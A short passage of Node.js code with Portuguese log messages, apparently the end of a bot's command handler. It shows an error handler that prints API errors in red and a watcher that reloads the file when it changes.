        if (/p7api/.test(err)) return console.log(chalk.red("[ERRO NA API] \n"))

        console.log(chalk.red("[ERRO] \n \n" + util.format(err)))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Arquivo Atualizado ${__filename}`))
    delete require.cache[file]
    require(file)
})
